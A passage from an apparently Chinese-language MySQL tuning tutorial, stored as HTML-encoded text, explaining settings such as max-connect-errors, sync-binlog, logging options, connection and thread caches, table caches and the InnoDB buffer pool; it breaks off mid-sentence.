4M&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6BD4;&#x8F83;&#x5C0F;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x592A;&#x5C0F;&#xFF0C;&#x6709;&#x65F6;&#x590D;&#x5236;&#x4E0A;&#x4F1A;&#x51FA;&#x95EE;&#x9898;&#xFF0C;&#x8868;&#x73B0;&#x4E3A;&#x4ECE;&#x5E93;&#x4E0D;&#x80FD;&#x63A5;&#x6536;&#x4E3B;&#x5E93;&#x53D1;&#x8FC7;&#x6765;&#x7684;&#x590D;&#x5236;&#x6570;&#x636E;&#x3002;&#x5982;&#x679C;&#x8868;&#x4E2D;&#x6709; Blob &#x6216;&#x8005; Text &#x5B57;&#x6BB5;&#xFF0C;&#x4E14;&#x6570;&#x636E;&#x91CF;&#x8F83;&#x5927;&#x7684;&#x8BDD;&#xFF0C;&#x8981;&#x5C0F;&#x5FC3;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x8D85;&#x8FC7;&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x88AB;&#x622A;&#x65AD;&#x6216;&#x8005;&#x7F6E;&#x4E3A; NULL&#xFF0C;&#x8FD9;&#x91CC;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x4E3A; 16M&#x3002;</p><p><strong>max-connect-errors</strong><br>&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x662F;&#x4E00;&#x4E2A; MySQL &#x4E2D;&#x4E0E;&#x5B89;&#x5168;&#x76F8;&#x5173;&#x7684;&#x8BA1;&#x6570;&#x5668;&#x503C;&#xFF0C;&#x5B83;&#x4E3B;&#x8981;&#x9632;&#x6B62;&#x5BA2;&#x6237;&#x7AEF;&#x66B4;&#x529B;&#x7834;&#x89E3;&#x5BC6;&#x7801;&#x3002;&#x5982;&#x679C;&#x67D0;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x5C1D;&#x8BD5;&#x8FDE;&#x63A5; MySQL &#x670D;&#x52A1;&#x5668;&#x5931;&#x8D25;&#x8D85;&#x8FC7; n &#x6B21;&#xFF0C;&#x5219; MySQL &#x4F1A;&#x65E0;&#x6761;&#x4EF6;&#x5F3A;&#x5236;&#x963B;&#x6B62;&#x6B64;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#xFF0C;&#x76F4;&#x5230;&#x518D;&#x6B21;&#x5237;&#x65B0;&#x4E3B;&#x673A;&#x7F13;&#x5B58;&#x6216;&#x8005;&#x91CD;&#x542F; MySQL &#x670D;&#x52A1;&#x5668;&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x503C;&#x9ED8;&#x8BA4;&#x4E3A; 10&#xFF0C;&#x592A;&#x5C0F;&#x4E86;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x7F51;&#x7EDC;&#x62BD;&#x98CE;&#x6216;&#x8005;&#x5E94;&#x7528;&#x914D;&#x7F6E;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x5BFC;&#x81F4;&#x77ED;&#x65F6;&#x95F4;&#x5185;&#x4E0D;&#x65AD;&#x5C1D;&#x8BD5;&#x91CD;&#x8FDE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5C31;&#x4F1A;&#x88AB;&#x5217;&#x5165;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x3002;&#x5982;&#x679C;&#x5728;&#x5185;&#x7F51;&#x73AF;&#x5883;&#xFF0C;&#x53EF;&#x4EE5;&#x786E;&#x8BA4;&#x6CA1;&#x6709;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x7F6E;&#x7684;&#x5927;&#x4E00;&#x70B9;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x592A;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x95EE;&#x9898;&#x3002;</p><h4 id="LOGGING"><a href="#LOGGING" class="headerlink" title="LOGGING"></a>LOGGING</h4><p>&#x63A5;&#x4E0B;&#x6765;&#x770B;&#x4E0B;&#x65E5;&#x5FD7;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x5BF9;&#x4E8E; MySQL &#x6765;&#x8BF4;&#xFF0C;&#x6162;&#x65E5;&#x5FD7;&#x548C; bin-log &#x662F;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x4E24;&#x79CD;&#x65E5;&#x5FD7;&#xFF0C;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x76D1;&#x63A7;&#x6027;&#x80FD;&#x95EE;&#x9898;&#xFF0C;&#x540E;&#x8005;&#x5728;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3001;&#x5907;&#x4EFD;&#x7B49;&#x65B9;&#x9762;&#x53D1;&#x6325;&#x7740;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5173;&#x4E8E; bin-log &#x7684; 3 &#x4E2A;&#x914D;&#x7F6E;&#xFF0C;log-bin&#x7528;&#x4E8E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x8DEF;&#x5F84;&#xFF0C;expire_logs_days&#x8BA9;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6307;&#x5B9A;&#x5929;&#x6570;&#x4E4B;&#x540E;&#x6E05;&#x7406;&#x65E7;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5373;&#x914D;&#x7F6E;&#x4FDD;&#x7559;&#x6700;&#x8FD1;&#x591A;&#x5C11;&#x5929;&#x7684;&#x65E5;&#x5FD7;&#x3002;&#x9664;&#x975E;&#x6709;&#x8FD0;&#x7EF4;&#x624B;&#x52A8;&#x5907;&#x4EFD;&#x6E05;&#x7406; bin-log&#xFF0C;&#x5426;&#x5219;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x6253;&#x5F00;&#x6B64;&#x914D;&#x7F6E;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x542F;&#x7528;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7A7A;&#x95F4;&#x6700;&#x7EC8;&#x5C06;&#x4F1A;&#x88AB;&#x8017;&#x5C3D;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x5361;&#x4F4F;&#x6216;&#x8005;&#x5D29;&#x6E83;&#x3002;</p><h4 id="sync-binlog"><a href="#sync-binlog" class="headerlink" title="sync-binlog"></a>sync-binlog</h4><p><code>sync-binlog</code>&#x63A7;&#x5236;&#x5F53;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL &#x662F;&#x5426;&#x5C06; bin-log &#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#x3002;&#x5982;&#x679C;&#x5176;&#x503C;&#x7B49;&#x4E8E; 0 &#x6216;&#x8005;&#x5927;&#x4E8E; 1 &#x65F6;&#xFF0C;&#x5F53;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#xFF0C;MySQL &#x4E0D;&#x4F1A;&#x5C06; bin-log &#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x5176;&#x6027;&#x80FD;&#x6700;&#x9AD8;&#xFF0C;&#x4F46;&#x5B58;&#x5728;&#x7684;&#x98CE;&#x9669;&#x4E5F;&#x662F;&#x6700;&#x5927;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x65E6;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#xFF0C;bin-log &#x5C06;&#x4F1A;&#x4E22;&#x5931;&#x3002;&#x800C;&#x5F53;&#x5176;&#x503C;&#x7B49;&#x4E8E; 1 &#x65F6;&#xFF0C;&#x662F;&#x6700;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5373;&#x4F7F;&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;&#xFF0C;&#x6700;&#x591A;&#x4E5F;&#x5C31;&#x4E22;&#x5931;&#x672C;&#x6B21;&#x672A;&#x5B8C;&#x6210;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x5BF9;&#x5B9E;&#x9645;&#x7684;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x5B9E;&#x8D28;&#x6027;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x6027;&#x80FD;&#x8F83;&#x5DEE;&#x3002;</p><p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5728; 5.7.7 &#x4E4B;&#x524D;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FD9;&#x4E2A;&#x9009;&#x62E9;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; 0&#xFF0C;&#x800C;&#x4E4B;&#x540E;&#x7684;&#x7248;&#x672C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; 1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6700;&#x5B89;&#x5168;&#x7684;&#x7B56;&#x7565;&#x3002;&#x5BF9;&#x4E8E;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x9632;&#x6B62;&#x7248;&#x672C;&#x5347;&#x7EA7;&#x540E;&#x51FA;&#x73B0;&#x6027;&#x80FD;&#x95EE;&#x9898;&#x3002;</p><p>&#x5269;&#x4E0B;&#x7684; 4 &#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x5C31;&#x6CA1;&#x592A;&#x591A;&#x8981;&#x8BF4;&#x7684;&#x3002;</p><ul><li>log-error&#xFF1A;&#x7528;&#x4E8E;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;</li><li>slow-query-log&#xFF1A;&#x6253;&#x5F00;&#x6162;&#x65E5;&#x5FD7;&#xFF0C;&#x9ED8;&#x8BA4;&#x5173;&#x95ED;</li><li>slow-query-log-file&#xFF1A;&#x914D;&#x7F6E;&#x6162;&#x65E5;&#x5FD7;&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;</li><li>log-queries-not-using-indexes&#xFF1A;&#x5982;&#x679C;&#x8BE5; sql &#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x4F1A;&#x5C06;&#x5176;&#x5199;&#x5165;&#x5230;&#x6162;&#x65E5;&#x5FD7;&#xFF0C;&#x4F46;&#x662F;&#x5426;&#x771F;&#x7684;&#x6267;&#x884C;&#x5F88;&#x6162;&#xFF0C;&#x9700;&#x8981;&#x533A;&#x5206;&#xFF0C;&#x9ED8;&#x8BA4;&#x5173;&#x95ED;&#x3002;</li></ul><h4 id="CACHES-AND-LIMITS"><a href="#CACHES-AND-LIMITS" class="headerlink" title="CACHES AND LIMITS"></a>CACHES AND LIMITS</h4><p><strong>tmp-table-size &amp;&amp; max-heap-table-size</strong><br>&#x8FD9;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x63A7;&#x5236;&#x4F7F;&#x7528; Memory &#x5F15;&#x64CE;&#x7684;&#x5185;&#x5B58;&#x4E34;&#x65F6;&#x8868;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x591A;&#x5927;&#x7684;&#x5185;&#x5B58;&#x3002;&#x5982;&#x679C;&#x9690;&#x5F0F;&#x5185;&#x5B58;&#x4E34;&#x65F6;&#x8868;&#x7684;&#x5927;&#x5C0F;&#x8D85;&#x8FC7;&#x8FD9;&#x4E24;&#x4E2A;&#x503C;&#xFF0C;&#x5C06;&#x4F1A;&#x88AB;&#x8F6C;&#x4E3A;&#x78C1;&#x76D8; MyISAM &#x8868; (&#x9690;&#x5F0F;&#x4E34;&#x65F6;&#x8868;&#x7531;&#x670D;&#x52A1;&#x5668;&#x521B;&#x5EFA;&#xFF0C;&#x7528;&#x6237;&#x4FDD;&#x5B58;&#x6267;&#x884C;&#x4E2D;&#x7684;&#x67E5;&#x8BE2;&#x7684;&#x4E2D;&#x95F4;&#x7ED3;&#x679C;)&#x3002;</p><p>&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x6CA1;&#x6709;&#x521B;&#x5EFA;&#x5E9E;&#x5927;&#x7684;&#x4E34;&#x65F6;&#x8868; (&#x901A;&#x8FC7;&#x5408;&#x7406;&#x7684;&#x7D22;&#x5F15;&#x548C;&#x67E5;&#x8BE2;&#x8BBE;&#x8BA1;&#x6765;&#x907F;&#x514D;)&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x5927;&#x4E00;&#x70B9;&#xFF0C;&#x4EE5;&#x514D;&#x9700;&#x8981;&#x628A;&#x5185;&#x5B58;&#x4E34;&#x65F6;&#x8868;&#x8F6C;&#x6362;&#x4E3A;&#x78C1;&#x76D8;&#x4E34;&#x65F6;&#x8868;&#x3002;&#x4F46;&#x8981;&#x8C28;&#x9632;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x7F6E;&#x5F97;&#x8FC7;&#x5927;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x786E;&#x5B9E;&#x4F1A;&#x521B;&#x5EFA;&#x5F88;&#x5927;&#x7684;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x78C1;&#x76D8;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x6BD5;&#x7ADF;&#x5E76;&#x53D1;&#x6570;&#x4E00;&#x8D77;&#x6765;&#xFF0C;&#x6240;&#x9700;&#x8981;&#x7684;&#x5185;&#x5B58;&#x5C31;&#x4F1A;&#x6025;&#x5267;&#x589E;&#x957F;&#x3002;</p><p>&#x5E94;&#x8BE5;&#x7B80;&#x5355;&#x7684;&#x628A;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x8BBE;&#x4E3A;&#x540C;&#x6837;&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x91CC;&#x9009;&#x62E9;&#x4E86; 32M&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4ED4;&#x7EC6;&#x68C0;&#x67E5;created-tmp-disk-tables&#x548C;created-tmp-tables&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x6765;&#x6307;&#x5BFC;&#x4F60;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x5C06;&#x5C55;&#x793A;&#x4E34;&#x65F6;&#x8868;&#x7684;&#x521B;&#x5EFA;&#x6709;&#x591A;&#x9891;&#x7E41;&#x3002;</p><p><strong>max-connections</strong></p><p>&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x7684;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x4FDD;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x4F1A;&#x5E94;&#x4E3A;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6FC0;&#x589E;&#x7684;&#x8FDE;&#x63A5;&#x800C;&#x4E0D;&#x582A;&#x91CD;&#x8D1F;&#x3002;&#x5982;&#x679C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x9047;&#x5230;&#x8FDE;&#x63A5;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#xFF0C;&#x4F1A;&#x521B;&#x5EFA;&#x5F88;&#x591A;&#x65B0;&#x8FDE;&#x63A5;&#x3002;&#x4F46;&#x5982;&#x679C;&#x8FD9;&#x4E9B;&#x8FDE;&#x63A5;&#x4E0D;&#x80FD;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x90A3;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6CA1;&#x4EC0;&#x4E48;&#x597D;&#x5904;&#xFF0C;&#x6240;&#x4EE5;&#x88AB; &#x201C;&#x592A;&#x591A;&#x7684;&#x8FDE;&#x63A5;&#x201D; &#x9519;&#x8BEF;&#x62D2;&#x7EDD;&#x662F;&#x4E00;&#x79CD;&#x5FEB;&#x901F;&#x800C;&#x4E14;&#x4EE3;&#x4EF7;&#x5C0F;&#x7684;&#x5931;&#x8D25;&#x65B9;&#x5F0F;&#x3002;</p><p>&#x5728;&#x670D;&#x52A1;&#x5668;&#x8D44;&#x6E90;&#x5141;&#x8BB8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;<code>max-connections</code>&#x8BBE;&#x7F6E;&#x7684;&#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x4EE5;&#x5BB9;&#x7EB3;&#x6B63;&#x5E38;&#x53EF;&#x80FD;&#x8FBE;&#x5230;&#x7684;&#x8D1F;&#x8F7D;&#x3002;&#x82E5;&#x8BA4;&#x4E3A;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x5C06;&#x6709; <code>300</code> &#x6216;&#x8005;&#x66F4;&#x591A;&#x8FDE;&#x63A5;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A; <code>500</code> &#x6216;&#x8005;&#x66F4;&#x591A; (&#x5E94;&#x5BF9;&#x9AD8;&#x5CF0;&#x671F;)&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#x662F; <code>100</code>&#xFF0C;&#x592A;&#x5C0F;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x4E3A; <code>500</code>&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;&#x5176;&#x662F;&#x4E00;&#x4E2A;&#x5408;&#x7406;&#x7684;&#x503C;&#xFF0C;&#x5E94;&#x8BE5;&#x76D1;&#x63A7;&#x5E94;&#x7528;&#x6709;&#x591A;&#x5C11;&#x8FDE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x6839;&#x636E;&#x76D1;&#x63A7;&#x503C; (&#x89C2;&#x5BDF;<code>max_used_connections</code>&#x968F;&#x65F6;&#x95F4;&#x7684;&#x53D8;&#x5316;) &#x6765;&#x8BBE;&#x7F6E;&#x3002;</p><p><strong>thread-cache-size</strong></p><p>&#x7EBF;&#x7A0B;&#x7F13;&#x5B58;&#x4FDD;&#x5B58;&#x90A3;&#x4E9B;&#x5F53;&#x524D;&#x6CA1;&#x6709;&#x4E0E;&#x8FDE;&#x63A5;&#x5173;&#x8054;&#x4F46;&#x662F;&#x51C6;&#x5907;&#x4E3A;&#x540E;&#x9762;&#x65B0;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x7684;&#x7EBF;&#x7A0B;&#x3002;&#x5F53;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x521B;&#x5EFA;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x7F13;&#x5B58;&#x4E2D;&#x6709;&#x7EBF;&#x7A0B;&#x5B58;&#x5728;&#xFF0C;MySQL &#x5219;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x5E76;&#x4E14;&#x628A;&#x5B83;&#x5206;&#x914D;&#x7ED9;&#x8FD9;&#x4E2A;&#x65B0;&#x8FDE;&#x63A5;&#x3002;&#x5F53;&#x8FDE;&#x63A5;&#x5173;&#x95ED;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x7EBF;&#x7A0B;&#x7F13;&#x5B58;&#x8FD8;&#x6709;&#x7A7A;&#x95F4;&#x7684;&#x8BDD;&#xFF0C;MySQL &#x53C8;&#x4F1A;&#x628A;&#x7EBF;&#x7A0B;&#x653E;&#x56DE;&#x7F13;&#x5B58;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7A7A;&#x95F4;&#x7684;&#x8BDD;&#xFF0C;MySQL &#x4F1A;&#x9500;&#x6BC1;&#x8FD9;&#x4E2A;&#x7EBF;&#x7A0B;&#x3002;&#x53EA;&#x8981; MySQL &#x5728;&#x7F13;&#x5B58;&#x91CC;&#x8FD8;&#x6709;&#x7A7A;&#x95F2;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x5B83;&#x5C31;&#x53EF;&#x4EE5;&#x8FC5;&#x901F;&#x54CD;&#x5E94;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x7528;&#x4E3A;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x521B;&#x5EFA;&#x65B0;&#x7EBF;&#x7A0B;&#x3002;<code>thread-cache-size</code>&#x6307;&#x5B9A; MySQL &#x53EF;&#x4EE5;&#x4FDD;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7EBF;&#x7A0B;&#x6570;&#x91CF;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5F88;&#x591A;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x8FD9;&#x4E2A;&#x503C;&#x3002;</p><p>&#x5982;&#x4F55;&#x5224;&#x65AD;&#x8FD9;&#x4E2A;&#x503C;&#x8BE5;&#x8BBE;&#x7F6E;&#x591A;&#x5927;&#xFF1F;</p><p>&#x89C2;&#x5BDF;threads-connected&#x53D8;&#x91CF;&#xFF0C;&#x5982;&#x679C;threads-connected&#x5728; 100-120&#xFF0C;&#x90A3;&#x4E48;thread-cache-size&#x8BBE;&#x7F6E;&#x4E3A; 20&#x3002;&#x5982;&#x679C;&#x5B83;&#x4FDD;&#x6301;&#x5728; 500-700&#xFF0C;200 &#x7684;&#x7EBF;&#x7A0B;&#x7F13;&#x5B58;&#x5E94;&#x8BE5;&#x8DB3;&#x591F;&#x5927;&#x4E86;&#x3002;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x7406;&#x89E3;&#xFF1A;&#x5F53;&#x540C;&#x65F6;&#x6709; 700 &#x4E2A;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x7F13;&#x5B58;&#x4E2D;&#x6CA1;&#x6709;&#x7EBF;&#x7A0B;&#x3002;&#x5728; 500 &#x4E2A;&#x8FDE;&#x63A5;&#x65F6;&#xFF0C;&#x6709; 200 &#x4E2A;&#x7F13;&#x5B58;&#x7684;&#x7EBF;&#x7A0B;&#x51C6;&#x5907;&#x4E3A;&#x8D1F;&#x8F7D;&#x518D;&#x6B21;&#x589E;&#x52A0;&#x5230; 700 &#x4E2A;&#x8FDE;&#x63A5;&#x65F6;&#x4F7F;&#x7528;&#x3002;</p><p><strong>open-files-limit</strong></p><p>&#x5728;&#x7C7B; Uinux &#x7CFB;&#x7EDF;&#x4E0A;&#x6211;&#x4EEC;&#x628A;&#x5B83;&#x8BBE;&#x7F6E;&#x5F97;&#x5C3D;&#x53EF;&#x80FD;&#x5927;&#x3002;&#x73B0;&#x4EE3; OS &#x4E2D;&#x6253;&#x5F00;&#x53E5;&#x67C4;&#x5F00;&#x9500;&#x90FD;&#x5F88;&#x5C0F;&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x8FC7;&#x5C0F;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230; &#x201C;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x592A;&#x591A; (too many open files)&#x201D; &#x9519;&#x8BEF;&#x3002;</p><p><strong>table_cache_size</strong></p><p>&#x8868;&#x7F13;&#x5B58;&#x8DDF;&#x7EBF;&#x7A0B;&#x7F13;&#x5B58;&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x5B58;&#x50A8;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x8868;&#xFF0C;&#x5176;&#x5305;&#x542B;&#x8868;. frm &#x6587;&#x4EF6;&#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x548C;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x3002;&#x51C6;&#x786E;&#x7684;&#x8BF4;&#xFF0C;&#x7F13;&#x5B58;&#x7684;&#x6570;&#x636E;&#x4F9D;&#x8D56;&#x4E8E;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E; MyISAM&#xFF0C;&#x7F13;&#x5B58;&#x8868;&#x7684;&#x6570;&#x636E;&#x548C;&#x7D22;&#x5F15;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x8868;&#x7F13;&#x5B58;&#x5BF9; InnoDB &#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x6765;&#x8BF4;&#xFF0C;&#x91CD;&#x8981;&#x6027;&#x4F1A;&#x5C0F;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x4E3A; InnoDB &#x4E0D;&#x4F9D;&#x8D56;&#x5B83;&#x6765;&#x505A;&#x90A3;&#x4E48;&#x591A;&#x7684;&#x4E8B;&#x3002;</p><p>&#x4ECE; 5.1 &#x7248;&#x672C;&#x53CA;&#x4EE5;&#x540E;&#xFF0C;&#x8868;&#x7F13;&#x5B58;&#x5C31;&#x88AB;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x90E8;&#x5206;&#xFF1A;&#x6253;&#x5F00;&#x8868;&#x7F13;&#x5B58;&#x548C;&#x5B9A;&#x4E49;&#x8868;&#x7F13;&#x5B58;&#xFF0C;&#x5206;&#x522B;&#x901A;&#x8FC7;table-open-cache-size&#x548C;table-definition-cache-size&#x53D8;&#x91CF;&#x6765;&#x914D;&#x7F6E;&#x3002;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x628A;table-definition-cache-size&#x8BBE;&#x7F6E;&#x5F97;&#x8DB3;&#x591F;&#x9AD8;&#xFF0C;&#x4EE5;&#x7F13;&#x5B58;&#x6240;&#x6709;&#x7684;&#x8868;&#x5B9A;&#x4E49;&#xFF0C;&#x56E0;&#x4E3A;&#x5927;&#x90E8;&#x5206;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x90FD;&#x80FD;&#x4ECE;table-definition-cache&#x83B7;&#x76CA;&#x3002;</p><p><strong>InnoDB</strong></p><p>InnoDB &#x5E94;&#x8BE5;&#x662F;&#x4F7F;&#x7528;&#x6700;&#x5E7F;&#x53D1;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x6700;&#x91CD;&#x8981;&#x7684;&#x914D;&#x7F6E;&#x9009;&#x9879;&#x662F;&#x4E0B;&#x9762;&#x8FD9;&#x4E24;&#x4E2A;&#xFF1A;innodb-buffer-pool-size&#x4E0E;innodb-log-file-size&#xFF0C;&#x89E3;&#x51B3;&#x8FD9;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x57FA;&#x672C;&#x4E0A;&#x5C31;&#x89E3;&#x51B3;&#x4E86;&#x771F;&#x5B9E;&#x573A;&#x666F;&#x4E0B;&#x7684;&#x5927;&#x90E8;&#x5206;&#x914D;&#x7F6E;&#x95EE;&#x9898;&#x3002;</p><p><strong>innodb-buffer-pool-size</strong></p><p>&#x5982;&#x679C;&#x5927;&#x90E8;&#x5206;&#x662F; InnoDB &#x8868;&#xFF0C;&#x90A3;&#x4E48; InnoDB &#x7F13;&#x51B2;&#x6C60;&#x6216;&#x8BB8;&#x6BD4;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x4E1C;&#x897F;&#x90FD;&#x66F4;&#x9700;&#x8981;&#x5185;&#x5B58;&#xFF0C;InnoDB &#x7F13;&#x51B2;&#x6C60;&#x7F13;&#x51B2;&#x7684;&#x6570;&#x636E;&#xFF1A;&#x7D22;&#x5F15;&#x3001;&#x884C;&#x6570;&#x636E;&#x3001;&#x81EA;&#x9002;&#x5E94;&#x54C8;&#x5E0C;&#x7D22;&#x5F15;&#x3001;&#x63D2;&#x5165;&#x7F13;&#x51B2;&#x3001;&#x9501;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x5185;&#x90E8;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002;InnoDB 